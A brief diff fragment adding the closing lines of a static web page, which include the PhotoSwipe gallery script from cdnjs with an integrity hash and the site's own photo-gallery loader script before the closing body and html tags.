+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://bzoltan1.github.io/js/load-photoswipe.js"></script>
+
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
+
